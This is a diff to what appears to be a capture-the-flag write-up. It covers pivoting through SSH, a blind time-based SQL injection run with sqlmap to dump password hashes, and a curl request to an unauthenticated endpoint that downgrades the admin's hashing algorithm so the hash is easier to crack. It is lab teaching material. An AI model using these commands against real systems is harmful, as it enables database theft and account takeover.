@@ -8,7 +8,37 @@ Starting by looking through the code, we can note a few interesting things.
 - In the register endpoint, if trying to register with an existing username, it will return the userid of the username in the URL.
 - We can see to the database schema.
 
-For this solution, we start by defining the IP and port of the server.
+## Enumeration
+
+We have initial access using SSH and the provided credential.
+
+```shell
+ssh user@<ip> -p <port>
+```
+
+We know there is a webserver on the same network which is the target. So we start enumerating.
+
+```shell
+ifconfig
+```
+
+We can note the current network and try to find the webserver IP.
+
+![alt text](nmap.png)
+
+Now, we can try to access the webpage using a simple proxy.
+
+```shell
+ssh user@<ip> -p <port> -D 9050
+```
+
+And configure the browser to use this proxy.
+
+![alt text](proxy.png)
+
+![alt text](webpage.png)
+
+For this solution, we can define the IP and port of the server.
 
 ```shell
 ip=<ip>
@@ -30,15 +60,8 @@ So admin userid is 1.
 
 ## SQLi
 
-SQL injection is possible in the getUserID endpoint. Since we do not get any data back and is not use in a login form, we can use a blind time-based injection to get the hash of the password. Using SQLMap, since this type of injection is really slow, we can order by id, which will start with 1 and therefore start with the admin and we can also use the ssh client offered to reduce network lag with the password `marbled-casino-zodiac-composer` and do a ping sweep to detect the ip of the webserver.
-Since the injection is on the username, we should use a username that doesn't exist. Otherwise, the server calculate the hash everytime, which takes a lot of time for bcrypt 16. 
-
-```shell
-ssh user@<ip_client>
-bash
-ifconfig
-for i in {1..254} ;do (ping -c 1 <base_ip>.$i | grep "bytes from" &) ;done
-```
+SQL injection is possible in the getUserID endpoint. Since we do not get any data back and is not use in a login form, we can use a blind time-based injection to get the hash of the password. Using SQLMap, since this type of injection is really slow, we can order by id, which will start with 1 and therefore start with the admin.
+Since the injection is on the username, we should use a username that doesn't exist. Otherwise, the server calculate the hash everytime, which takes a lot of time for bcrypt 16.
 
 ```shell
 sqlmap -u "http://$ip:$port/login"  --data 'username=ausndbaiusdbniand&password=test' -C id,password_hash,salt -T Users -D userDB --dump  --batch --dbms MySQL -p username --technique=T
@@ -69,7 +92,7 @@ Table: HashingAlgorithm
 
 ![alt text](sqlmap_2.png)
 
-We can change the hashing algorithm of the admin for blake2b with 1 round, which is very fast to crack.
+We can change the hashing algorithm of the admin, since this endpoint is not authentificated. Using blake2b with 1 round is very fast to crack.
 
 ```shell
 curl "http://$ip:$port/changeHash" \
